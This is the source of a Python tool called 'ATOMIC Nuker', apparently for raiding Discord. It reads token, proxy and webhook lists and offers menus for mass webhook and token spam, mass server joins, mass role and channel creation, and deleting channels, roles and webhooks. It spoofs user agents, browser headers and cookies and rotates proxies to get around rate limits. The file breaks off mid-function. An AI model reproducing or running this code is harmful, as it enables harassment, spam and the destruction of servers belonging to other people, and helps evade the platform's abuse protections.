from pystyle import *
import os
# from colorama import *
import asyncio
import requests as req
import sys
import random
import time
from fake_useragent import UserAgent
from threading import Thread
from aiohttp import ClientSession
import base64
from datetime import datetime

System.Clear()
System.Title("ATOMIC - By M. logique")
lllll = ['proxies.txt', 'webhooks.txt', 'tokens.txt']
if not os.path.exists('./Atomic'):
    os.system('md Atomic')
    with open('./Atomic/useragents.txt', 'w') as file:
        ua = UserAgent()
        file.write('\n'.join([ua.random for _ in range(50)]))
elif os.path.exists('./Atomic') and not os.path.exists('./Atomic/useragents.txt'):
    with open('./Atomic/useragents.txt', 'w') as file:
        ua = UserAgent()
        file.write('\n'.join([ua.random for _ in range(50)]))
else:
    with open('./Atomic/useragents.txt', 'w') as file:
        ua = UserAgent()
        file.write('\n'.join([ua.random for _ in range(50)]))
for i in lllll:
    # else:
    if not os.path.exists(i): 
        open(i, 'x').close()
intro = '''
          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'  ATOMIC  `98v8P'  NUKER    `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '

                               
                      > Press Enter
'''
def print_logo():
    System.Clear()
    banner = '''

         █████╗ ████████╗ █████╗ ███╗   ███╗██╗ █████╗ 
        ██╔══██╗╚══██╔══╝██╔══██╗████╗ ████║██║██╔══██╗ 
        ███████║   ██║   ██║  ██║██╔████╔██║██║██║  ╚═╝  by M. logique
        ██╔══██║   ██║   ██║  ██║██║╚██╔╝██║██║██║  ██╗
        ██║  ██║   ██║   ╚█████╔╝██║ ╚═╝ ██║██║╚█████╔╝
        ╚═╝  ╚═╝   ╚═╝    ╚════╝ ╚═╝     ╚═╝╚═╝ ╚════╝

    > github.com/M-logique'''
    b = Colorate.Vertical(Colors.DynamicMIX((Col.green, Col.light_green, Col.yellow)), Center.XCenter(banner))
    # Write.Print(text=banner, interval=0.0005, color=Colors._)
    print(b)
    print()
    
def print_(text):
        Write.Print(f'\n     {text}', Colors.yellow_to_green, interval=0.01)
def input_():
    return input(f'{Col.yellow}\n        >>> {Colors.reset}') or 'Bruh'

def print_err(err):
    print('\n     {0}[-]{1} {2}'.format(Col.red, Col.yellow, err), end=f'{Colors.reset}')
def print_success(err):
    print('\n     {0}[+]{1} {2}'.format(Col.green, Col.yellow, err), end=f'{Colors.reset}')

async def bomb(bbb=list):
    kh = []
    for i in bbb:
        if i.endswith('\n'):
            kh.append(i.split('\n')[0])
        else: kh.append(i)
    else: 
        return kh

def check(webhook):
        try:
            bomb = req.get(webhook)
            if not bomb.status_code == 200:
                return False
            else:
                bomb_json = bomb.json()
                if not bomb_json['guild_id'] or not bomb_json['channel_id']:
                    return False
                else: return bomb_json
        except:
            pass

def send_webhook(url=str, content=str, proxy=None):
    try:
        req.post(url=url,
                json={"content": content, "username": "Atomic Nuker", "avatar_url": "https://media.discordapp.net/attachments/1054650838129332255/1153307620187312168/convert.png?width=402&height=402"}
                ,proxies=proxy)
        print_success(url)
    except: print_err(url)
def get_webhooks():
    file = open('webhooks.txt', 'r')
    webhooks = file.readlines()
    kh = []
    for i in webhooks:
        if i.endswith('\n'):
            kh.append(i.split('\n')[0])
        else:
            kh.append(i)
    else:
        file.close()
        return kh
def random_useragent():
    with open('./Atomic/useragents.txt', 'r') as file:
        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36" 
    # This shit had bugs so i removed this

Anime.Fade(Center.Center(intro), Colors.yellow_to_green, Colorate.Vertical, interval=0.0035, enter=True)


async def webhookTools():
    print_logo()
    webhook_txt = '''
        << Webhooks Category >> 
        1. Spam with only 1 webhook
        2. Spam with +1 webhooks (By using webhooks.txt)
        3. Delete Webhook
        4. Delete Webhooks (By using webhooks.txt)
        5. Check Webhook 
        6. Check Webhooks (By using webhooks.txt)
        7. Back to main menu
        8. Exit
    '''
    Write.Print(webhook_txt, Colors.yellow_to_green, interval=0.003)
    print_("[~/Webhooks] Choose an Option")
    ch = input_()
    n = [str(i) for i in range(1,9)]
    if not ch in n:
        await webhookTools()
    elif ch == '8':
        sys.exit()
    elif ch == '7':
        await main_menu()
    if ch == '1':
        print_logo()
        print_('[=] Enter Webhook URL For Spam')
        url = input_()
        print_('[=] Enter Message For Spam')
        message = input_()
        print_('[=] Enter Spam Count')
        count = input_()
        print_('[??] Are you willing to use proxy? [Y, N] ')
        proxy = input_()
        if not url or not message or not count or not count.isalnum():
            await webhookTools()
        if not proxy or not proxy.lower().startswith('y'):
            if check(url):
                print_logo()
                for i in range(int(count)):
                        Thread(target=send_webhook, args=(url, message, None), name=url).start()
                else:
                    await webhookTools()
            else:
                await webhookTools()
        else: 
            Write.Print('\n     [??] How many proxies do you want to use? ', Colors.yellow_to_green, interval=0.01)
            amount = input_()
            if not amount or not amount.isalnum(): await webhookTools()
            else:
                try: 
                    with open('proxies.txt', 'r') as file:
                        p = file.readlines()
                        if len(p) < 0:
                            await webhookTools()
                        p_ = []
                        for i in p:
                            if i.endswith('\n'):
                                p_.append(i.split('\n')[1])
                            else:
                                p_.append(i)
                        else: 
                            print_logo()
                            print_('[!!] Checking proxies')
                            checked = []
                            for i in p_:
                                if len(checked) < int(amount):    
                                    try:
                                        prs = {
                                            "http": i,
                                            "https": i
                                        }
                                        ip = req.get("https://api.myip.com", proxies=prs)
                                        print_('Added 1 to checked list')
                                        checked.append(i)
                                    except: 
                                        print_err('Failed to Connect with this one')
                            else:
                                print_logo()
                                if len(checked) > 0:
                                    for i in range(int(count)):
                                        pr = random.choice(checked)
                                        pr_ = {
                                            "http": pr,
                                            "https": pr
                                        }
                                        Thread(target=send_webhook, args=(url, message, pr_), name=url).start()

                                    else:
                                        time.sleep(3)
                                        await webhookTools()
                                else: await webhookTools()
                                    


                except:
                    await webhookTools()
    if ch == '2':
        w = get_webhooks()
        if len(w) > 0: 
            webhooks = w
            print_logo()
            print_('[=] Enter Message for spam')
            msg = input_()
            print_("[=] Enter Spam count")
            count = input_()
            print_("[??] Are you willing to use proxy? [Y, N]")
            proxy_usage = input_()
            if not msg or not count or not count.isalnum() or not len(w) >0: await webhookTools()
            else: 
                if not proxy_usage.lower().startswith('y'):
                    checked_hooks = []
                    print_('[!!] Checking Webhooks')
                    for i in webhooks: 
                        if check(i):
                            checked_hooks.append(i)
                    else:
                        print_logo()
                        for i in range(int(count)):
                            for i in checked_hooks:
                                Thread(target=send_webhook, args=(i, msg, None), name=i).start()

                        else:
                            time.sleep(3)
                            await webhookTools()
                else:
                    print_('[??] How many proxies do you want to use?')
                    amount = input_()
                    with open('proxies.txt', 'r') as file:
                        p = file.readlines()
                        if len(p) < 0:
                            await webhookTools()
                        p_ = []
                        for i in p:
                            if i.endswith('\n'):
                                p_.append(i.split('\n')[1])
                            else:
                                p_.append(i)
                        else: 
                            print_logo()
                            checked = []
                            print_('[!!] Checking Proxies')
                            print()
                            for i in p_:
                                if len(checked) < int(amount):    
                                    try:
                                        prs = {
                                            "http": i,
                                            "https": i
                                        }
                                        ip = req.get("https://api.myip.com", proxies=prs)
                                        print_success(f'Added 1 to checked list {str(i)}')
                                        checked.append(i)
                                    except: 
                                        print_err(f'Failed To connect with this one') 
                            else: 
                                checked_hooks = []
                                print()
                                print_logo()
                                print_('[!!] Checking Webhooks')
                                for i in webhooks: 
                                    if check(i):
                                        print_success(i)
                                        checked_hooks.append(i)
                                else:
                                    if len(checked) > 0:
                                        print_logo()
                                        print_(f'started spamming with {len(checked_hooks)} webhook(s)')
                                        for i in range(int(count)):
                                            p = random.choice(checked)
                                            pr = {
                                                "http": p,
                                                "https": p
                                            }
                                            for i in checked_hooks:
                                                Thread(target=send_webhook, args=(i, msg, pr), name=i).start()
                                        else:
                                            time.sleep(round(int(count)/4))
                                            await webhookTools()
                                    else: await webhookTools()
        else: await webhookTools()
    elif ch == '3':
        print_logo()
        print_('[=] Enter the webhook that you want to delete it')
        web = input_()
        print_logo()
        try:
            req.delete(web)
            print_success(f'Deleted {web}')
        except: 
            print_err(f'Failed to delete {web}')
        finally:
            time.sleep(3)
            await webhookTools()
    elif ch == '4':
        w = get_webhooks()
        if len(w) > 0:
            print_logo()
            print_(f'[??] are you sure you want to delete {len(w)} webhook(s)? [Y, N]')
            ch_ = input_()
            if ch_.lower().startswith('y'):
                print_logo()
                print_(f'[!!] Started deleting {len(w)} webhook(s)')
                for i in w:
                    try:
                        req.delete(i)
                        print_success(f'Deleted {i}')
                    except: 
                        print_err(f'Failed to delete {i}')
                else:
                    print_('[??] Do you want to remove "webhooks.txt" file? [Y, N]')
                    ch__ = input_()
                    if ch__.lower().startswith('y'):
                        try:
                            os.remove('webhooks.txt')
                            open('webhooks.txt', 'x').close()
                        except: pass
                        finally: await webhookTools() 
                    else: await webhookTools()

            else: await webhookTools()
        else: await webhookTools()

    elif ch == '5':
        print_('[=] Enter the webhook that you want to check it')
        url = input_()
        print_logo()
        if not check(url):
            print_success('This webhook is invalid!')
        else:
            print_err('This webhook is valid')
        time.sleep(3)
        await webhookTools()
    elif ch == '6':
        webs = get_webhooks()
        if len(webs) <0:
            await webhookTools()
        else:
            print_logo()
            print_(f'[!!] Started checking {len(webs)} webhook(s)')
            print()
            checked_hooks = []
            for i in webs:
                if check(i):
                    checked_hooks.append(i)
                    print_success(f'{i} i valid')
                else: 
                    print_err(f'{i} is invalid')
            else:
                if len(checked_hooks) > 0:
                    print_(f'[??] Do you want to save {len(checked_hooks)} valid webhook(s) in a new file? ')
                    yon = input_()
                    if yon.lower().startswith('y'):
                        with open('checked_webhooks.txt', 'w') as file:
                            file.write('\n'.join(checked_hooks))
                            print_('[!!] Saved!')
                            time.sleep(2)
                            await webhookTools()
                    else: await webhookTools()
                else:
                    time.sleep(1)
                    await webhookTools()
    
    else: 
        await webhookTools()
def leave_server(server_id, token):
    headers = {
        "User-Agent": random_useragent(),
        "authorization": token
    }
    req.delete(url=f"https://discord.com/api/v9/users/@me/guilds/{server_id}",
               headers=headers)
    print_success(token)
def sendMessage(token, channel, msg, proxy=None):
    r = req.post(url=f'https://discord.com/api/v9/channels/{channel}/messages', 
                                headers={"Authorization": token,
                                        "Content-Type": 'application/json',
                                        "user-agent": random_useragent()
                                        }, json={"content": msg})
    print_success(f'Sent {token}') if r.status_code == 200 else print_err(token)
async def tokenTools():
    def tokens():
        with open('tokens.txt', 'r') as file:
            tks = file.readlines()
            kh = []
            for i in tks:
                if i.endswith('\n'):
                    kh.append(i.split('\n')[0])
                else:
                    kh.append(i)
            else: return kh
    print_logo()
    tokens_txt = '''
                                               << Tokens Category >>
                          
  >> Multi Token Raiding         >> Single Token Nuking         >> Account Nuking                >> Tools
  1. Spam in one channel         8.  Webhook Spam Channels      15. Remove all friends           22. Check Token
  2. Spam in all channels        9.  Mass Create Roles          16. Block all friends            23. Check Tokens
  3. Add Reaction to a Message   10. Mass Create channels       17. Leave all servers            24. Get Guild info
  4. Join to a server            11. Delete all channels        18. Cycle Token Settings         25. Get Token Info
  5. Leave a server              12. Delete all roles           19. Mass dm                      26. Get Tokens Info
  6. Change Nickname             13. Remove all Emojis          20. Close all Dms                27. Back to Main Menu
  7. Change Status               14. Change server icon         21. Delete all personal guilds   28. Exit

    '''
    Write.Print(tokens_txt, Colors.yellow_to_green, interval=0.0005)
    print_('[~/Tokens] Choose an Option')
    ch = input_()
    if not ch in [str(i) for i in range(1,29)]:
        await tokenTools()
    elif ch == '27':
        await main_menu()
    elif ch == '28':
        sys.exit()
    if ch == '1':
        print_logo()
        print_('[=] Enter the message that you want to spam with')
        msg = input_()
        print_('[=] Enter Channel ID For spam')
        chid = input_()
        print_('[=] How many times do you want to send spam message in this channel? ')
        count = input_()
        print_('[??] Are you willing to use proxies? [Y, N]')
        pruse = input_()
        if not pruse.lower().startswith('y'):
            tks = tokens()
            if len(tks) > 0:
                print_logo()
                for i in range(int(count)):
                    for token in tks:
                        Thread(target=sendMessage, args=(token, chid, msg, None), name=token).start()

                else:
                    time.sleep(4) 
                    await tokenTools()
            else: await tokenTools()
        else: 
            # print()
            print_('[??] How many proxies do you want to use?')
            p__ = input_()
            # print_logo()
            # print_('[!!] Checking proxies')
            tks = tokens()
            p_ = []
            if p__.isalnum():
                with open('proxies.txt', 'r') as file:
                    p = file.readlines()
                    for i in p:
                        if i.endswith('\n'):
                            p_.append(i.split('\n')[0])
                        else: 
                            p_.append(i)
                    else:
                        checked = []
                        print_logo()
                        print_('[!!] Checking proxies')
                        for i in p_:
                            if len(checked) < int(p__):    
                                try:
                                    prs = {
                                        "http": i,
                                        "https": i
                                    }
                                    ip = req.get("https://api.myip.com", proxies=prs)
                                    print_success(f'Added 1 to checked list {str(i)}')
                                    checked.append(i)
                                except: 
                                    print_err(f'Failed To connect with this one') 
                        else:
                            if len(checked) > 0:
                                if len(tks) > 0:
                                    print_logo()
                                    for i in range(int(count)):
                                        for token in tks:
                                            pr = random.choice(checked)
                                            pr_ = {
                                                "http": pr,
                                                "https": pr
                                            }
                                            Thread(target=sendMessage, args=(token, chid, msg, pr_), name=token).start()
                                            # except: print_err(token)

                                    else:
                                        time.sleep(round(int(count/4)))
                                        await tokenTools()
                                else: await tokenTools()
                            else: await tokenTools()
            else:
                await tokenTools()
    if ch == '2':
        print_logo()
        print_('[=] Enter the message that you want to spam with')
        msg = input_()
        print_('[=] Enter the server id for spam')
        svid = input_()
        print_('[??] How many times do you want to send spam message in channels?')
        times = input_()
        print_('[??] Are you willing to use proxy? [Y, N]')
        prxy = input_()
        tks = tokens()
        if len(tks) > 0 and times.isalnum():
            if not prxy.lower().startswith('y'):
                print_logo()
                print_('[!!] Started scrapping')
                chs = []
                for token in tks:
                    r = req.get(url=f'https://discord.com/api/v9/guilds/{svid}/channels',
                            headers={ "Authorization": token,
                                     "user-agent": random_useragent(),
                                     "Content-Type": 'application/json'})
                    if r.status_code == 200:
                        for chnl in r.json():
                            types = [0, 2, 13, 5]
                            if chnl['type'] in types and chnl['id'] not in chs:
                                chs.append(chnl['id'])
                                print_success(f'Added {chnl["id"]}')
                else: 
                    time.sleep(1)
                    print_logo()
                    for i in range(int(times)):
                        for ch in chs:
                            time.sleep(0.5)
                            for token in tks:
                                Thread(target=sendMessage, args=(token, ch, msg, None), name=token).start()

                                
                    else:
                        time.sleep(4)
                        await tokenTools()
            else: 
                p = []
                with open('proxies.txt', 'r') as file:
                    p = await bomb(file.readlines())
                print_('[??] How many proxies do you want to use?')
                how_many = input_()
                if how_many.isalnum() and len(p) > 0:
                    print_logo()
                    print_('[!!] Started checking proxies')
                    checked_proxies = []
                    for proxy in p:
                        sex = int(how_many)
                        if len(checked_proxies) < sex:
                            try:
                                req.get(url='https://api.myip.com',
                                        proxies={ "http": proxy, "https": proxy})
                                checked_proxies.append(proxy)
                                print_success(f'Added 1 to checked list {proxy}')
                            except: print_err('Failed to connect with this one')
                    else: 
                        time.sleep(1)
                        if len(checked_proxies) > 0:
                            print_logo()
                            print_('[!!] Started scrapping')
                            chs = []
                            for token in tks:
                                r = req.get(url=f'https://discord.com/api/v9/guilds/{svid}/channels',
                                        headers={ "Authorization": token,
                                                "user-agent": random_useragent(),
                                                "Content-Type": 'application/json'})
                                if r.status_code == 200:
                                    for chnl in r.json():
                                        types = [0, 2, 13, 5]
                                        if chnl['type'] in types and chnl['id'] not in chs:
                                            chs.append(chnl['id'])
                                            print_success(f'Added {chnl["id"]}')
                            else: 
                                time.sleep(1)
                                print_logo()
                                for i in range(int(times)):
                                    for ch in chs:
                                        for token in tks:
                                            try:
                                                p = random.choice(checked_proxies)
                                                p_ = { "http": p,
                                                       "https": p
                                                       }
                                                Thread(target=sendMessage, args=(token, ch, msg, p_), name=token).start()
                                            except Exception as err: 
                                                print_err(token)
                                                # time.sleep(4)
                                else:
                                    time.sleep(round(int(times/4)))
                                    await tokenTools()
                        else: await tokenTools()
                
                    
        else: await tokenTools()
    elif ch == '3':
        print_logo()
        print_('[=] Enter the channel id')
        chid = input_()
        print_('[=] Enter the message id')
        msgid = input_()
        print_('[=] Enter the emoji. (Normal Emojis or "ID" od )')
        emoji_ = input_()
        tks = tokens()
        emoji = f'sex:{emoji_}' if emoji_.isalnum() else str(emoji_)
        if len(tks) > 0:
            print_logo()
            for token in tks:
                b = req.put(url=f'https://discord.com/api/channels/{chid}/messages/{msgid}/reactions/{emoji}/@me',
                            headers={ "Authorization": token,
                                        "user-agent": random_useragent(),
                                        "Content-Type": "application/json"}) 
                if b.status_code == 204:
                    print_success(token)
                else:
                    print_err(token)
            else: await tokenTools()
                
        else: await tokenTools()
    if ch =='4':
        print_logo()
        print_('[=] Enter The invite code')
        invite_code = input_()
        print_('[??] Are you willing to use proxy? [Y, N]')
        proxy_use = input_()
        if not proxy_use.lower().startswith('y'): 
            if len(tokens()) > 0:
                print_logo()
                print_('[!!] Started Joining')
                for token in tokens():
                    async with ClientSession() as session:
                        headers = {
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
                            'Accept': '*/*',
                            'Accept-Language': 'fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Content-Type': 'application/json',
                            'X-Context-Properties': 'eyJsb2NhdGlvbiI6IkpvaW4gR3VpbGQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijk4OTkxOTY0NTY4MTE4ODk1NCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI5OTAzMTc0ODgxNzg4NjgyMjQiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjB9',
                            'Authorization': token,
                            'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJmciIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTAyLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTM2MjQwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',
                            'X-Discord-Locale': 'en-US',
                            'X-Debug-Options': 'bugReporterEnabled',
                            'Origin': 'https://discord.com',
                            'DNT': '1',
                            'Connection': 'keep-alive',
                            'Referer': 'https://discord.com',
                            'Cookie': '__dcfduid=21183630021f11edb7e89582009dfd5e; __sdcfduid=21183631021f11edb7e89582009dfd5ee4936758ec8c8a248427f80a1732a58e4e71502891b76ca0584dc6fafa653638; locale=en-US',
                            'Sec-Fetch-Dest': 'empty',
                            'Sec-Fetch-Mode': 'cors',
                            'Sec-Fetch-Site': 'same-origin',
                            'TE': 'trailers',
                        }
                        resp = await session.post(f"https://canary.discord.com/api/v9/invites/{invite_code}", headers=headers, json={})
                        if resp.status == 200:
                            print_success(f'Joined with {token}')
                        elif resp.status == 429:
                            print_err(f'Token {token} is rate limited')
                        elif resp.status == 403:
                            print_err(f'Locked Token {token}')
                        elif resp.status == 401:
                            print_err(f'Unauthorized {token} ')
                        else: 
                            j = await resp.json()
                            print_err(f'{resp.status}, {j}')
                else:
                    time.sleep(1) 
                    await tokenTools()            
            else: 
                await tokenTools()
        else: 
            print_('[??] How many proxies do you want to use?')
            proxy_count = input_()
            with open('proxies.txt', 'r') as file:
                p = file.readlines()
                p_ = []
                for i in p:
                    if i.endswith('\n'):
                        p_.append(i.split('\n')[0])
                    else:
                        p_.append(i)
                else:
                    checked = []
                    for i in p_:
                        if len(checked) < int(proxy_count):
                            try:
                                sex = {
                                    "http": i,
                                    "https": i
                                }
                                req.get(url='https://api.myip.com', proxies=sex)
                                print_success(i)
                                checked.append(i)
                            except:
                                print_err(i) 
                    else:
                        if len(tokens()) > 0:
                                        print_logo()
                                        print_('[!!] Started Joining')
                                        for token in tokens():
                                            async with ClientSession() as session:
                                                headers = {
                                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
                                                    'Accept': '*/*',
                                                    'Accept-Language': 'fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3',
                                                    'Accept-Encoding': 'gzip, deflate, br',
                                                    'Content-Type': 'application/json',
                                                    'X-Context-Properties': 'eyJsb2NhdGlvbiI6IkpvaW4gR3VpbGQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijk4OTkxOTY0NTY4MTE4ODk1NCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI5OTAzMTc0ODgxNzg4NjgyMjQiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjB9',
                                                    'Authorization': token,
                                                    'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJmciIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTAyLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTM2MjQwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',
                                                    'X-Discord-Locale': 'en-US',
                                                    'X-Debug-Options': 'bugReporterEnabled',
                                                    'Origin': 'https://discord.com',
                                                    'DNT': '1',
                                                    'Connection': 'keep-alive',
                                                    'Referer': 'https://discord.com',
                                                    'Cookie': '__dcfduid=21183630021f11edb7e89582009dfd5e; __sdcfduid=21183631021f11edb7e89582009dfd5ee4936758ec8c8a248427f80a1732a58e4e71502891b76ca0584dc6fafa653638; locale=en-US',
                                                    'Sec-Fetch-Dest': 'empty',
                                                    'Sec-Fetch-Mode': 'cors',
                                                    'Sec-Fetch-Site': 'same-origin',
                                                    'TE': 'trailers',
                                                }
                                                resp = await session.post(f"https://canary.discord.com/api/v9/invites/{invite_code}", headers=headers, json={}, proxy= random.choice(checked_proxies))
                                                if resp.status == 200:
                                                    print_success(f'Joined with {token}')
                                                elif resp.status == 429:
                                                    print_err(f'Token {token} is rate limited')
                                                elif resp.status == 403:
                                                    print_err(f'Locked Token {token}')
                                                elif resp.status == 401:
                                                    print_err(f'Unauthorized {token} ')
                                                else: 
                                                    j = await resp.json()
                                                    print_err(f'{resp.status}, {j}')
                                        else:
                                            time.sleep(1) 
                                            await tokenTools()            
                        else: await tokenTools()
    if ch == '5':
        print_logo()
        print_('[=] Enter server id')
        server_id = input_()
        if len(tokens()) > 0 and server_id.isalnum():
            for token in tokens():
                # print_success(token) if leave_server(server_id, token).status_code() == 204 else print_err(token)
                Thread(target=leave_server, args=(server_id, token), name=token).start()
            else:
                time.sleep(1)
                # input()
                await tokenTools()
        else: await tokenTools()
    
    if ch == '6':
        print_logo()
        print_('[=] Enter the guild ID')
        guilid = input_()
        print_('[=] Enter the nickname')
        nick = input_()
        if guilid.isalnum() and len(tokens()) > 0: 
            print_logo()
            for token in tokens():
                headers = {
                    "Authorization": token,
                    "X-Audit-Log-Reason": 'Atomic Nuker',
                    "User-Agent": random_useragent(),
                    "Content-Type": 'application/json'
                }
                bb = req.patch(url=f"https://discord.com/api/v9/guilds/{guilid}/members/@me",
                               headers=headers,
                               json={ "nick": nick})
                if bb.status_code == 200:
                    print_success(token)
                else: 
                    print_err(token)
            else: 
                await tokenTools()
        else: await tokenTools()
    if ch == '7':
        print_logo()
        print_('[=] Enter the status text')
        text = input_()
        print_logo()
        if len(tokens()) >0:
            for token in tokens():
                headers = {
                    "Authorization": token,
                    "User-Agent": random_useragent()
                }
                req.patch(url="https://discord.com/api/v8/users/@me/settings",
                          headers=headers,
                          json={ "custom_status": {"text": text, "emoji_name": "💊"}})
                print_success(token)
            else: await tokenTools()
    if ch == '8':
        print_logo()
        ws = []
        print_('[=] Enter the guild id')
        guild_id = input_()
        print_('[=] Enter message for spam')
        msg = input_()
        print_('[=] Enter Spam count')
        count = input_()
        print_('[??] How many Webhook(s) for each channel?')
        wfec = input_()
        print_logo()
        if len(tokens()) > 0 and count.isalnum() and wfec.isalnum():
            with open('proxies.txt', 'r') as file:
                # proxy = random.choice(file.readlines()).strip() if len(file.readlines()) > 0 else None
                proxy = None
        chs = []
        r = req.get(url=f'https://discord.com/api/v9/guilds/{guild_id}/channels',
                        headers={ "Authorization": tokens()[0],
                                    "user-agent": random_useragent(),
                                    "Content-Type": 'application/json'})
        if r.status_code == 200:
            for chnl in r.json():
                types = [0, 2, 13, 5]
                if chnl['type'] in types and chnl['id'] not in chs:
                    chs.append(chnl['id'])
                    print_success(f'Added {chnl["id"]}')
            else:
                if len(chs) > 0:
                    print_logo()
                    for channel in chs:
                        for i in range(int(wfec)):
                            try:
                                p = req.post(url=f'https://discord.com/api/channels/{channel}/webhooks',
                                            headers={
                                                "Authorization": tokens()[0],
                                                "X-Audit-Log-Reason": "Atomic Nuker",
                                            },
                                            json={"name": "Atomic Nuker"})
                                # print(p.json())
                                ws.append(p.json()['url'])
                                print_success(p.json()['url'])
                            except: pass
                        
                    else:
                    # with open('temp-webhooks.txt', 'r') as file:
                        if len(ws) >0:
                            print_logo()
                            for i in range(int(count)):
                                for webhook in ws:
                                    # send_webhook()
                                    Thread(target=send_webhook, args=(webhook, msg, None)).start()
                            else:
                                # file.close()
                                # os.remove('temp-webhooks.txt')
                                with open('webhooks.txt', 'a') as file:
                                    file.write('\n'+'\n'.join(ws))
                                time.sleep(10)
                                await tokenTools()
                        else: 
                            await tokenTools()
                else: await tokenTools()
    if ch == '9':
        print_logo()
        print_("[=] Enter Guild Id")
        guild_id = input_()
        print_("[=] Enter A Name for roles")
        name = input_()
        print_("[??] How many Roles do you want to create?")
        count = input_()

        if len(tokens()) >0 and count.isalnum():
            print_logo()
            print_(f"[!!] Started Creating {count} role(s)")
            for i in range(int(count)): 
                bruh = req.post(url=f"https://discord.com/api/guilds/{guild_id}/roles",
                         headers={ 
                             "Authorization": tokens()[0],
                             "User-Agent": random_useragent(),
                             "X-Audit-Log-Reason": "Atomic Nuker"
                         },
                         json={
                             "name": name,
                             "color": random.randint(0, 16777215)
                         })
                try:
                    print_success(f"Created {Col.green}{bruh.json()['id']}")
                except:
                    print_err(f"Failed To Create role {Col.red}{name}")
                    # print(bruh.json())
                # input()
            else:
                await tokenTools()
        else:
            await tokenTools()
    if ch == '10':
        print_logo()
        print_("[=] Enter the guild id")
        guild_id = input_()
        print_("[=] Enter A Name for channels")
        name = input_()
        print_("[=] Enter a type for channels [text/voice]")
        type_ = input_()
        print_("[??] How many Channels do you want to create?")
        count = input_()
        if len(tokens()) > 0 and count.isalnum() and type_.strip() in ['text', 'voice']:
            print_logo()
            def create_channel(guild_id, name, type_):
                b = req.post(url=f"https://discord.com/api/guilds/{guild_id}/channels",
                        headers={
                            "User-Agent": random_useragent(),
                            "Authorization": tokens()[0],
                            "X-Audit-Log-Reason": "Atomic Nuker"
                        },
                        json={
                            "name": name,
                            "type": {"text": 0, "voice": 2}[type_]
                        })
                try:
                    print_success(f"Created {Col.green}{b.json()['id']}")
                except:
                    print_err(f"Failed to create {Col.red}{name}")
            print_(f"[!!] Started Creating {count} channel(s)")
            for i in range(int(count)):
                Thread(target=create_channel, name=i, args=(guild_id, name, type_)).start()
                time.sleep(0.5)
            else:
                time.sleep(1)
                await tokenTools()
        else:
            await tokenTools()
    if ch == '11':
        print_logo()
        print_("[=] Enter Guild id")
        guild = input_()
        print_logo()
        if guild.isalnum() and len(tokens()) > 0:
            r = req.get(url=f'https://discord.com/api/v9/guilds/{guild}/channels',
                            headers={ "Authorization": tokens()[0],
                                        "user-agent": random_useragent(),
                                        "Content-Type": 'application/json'})
            if r.status_code == 200:
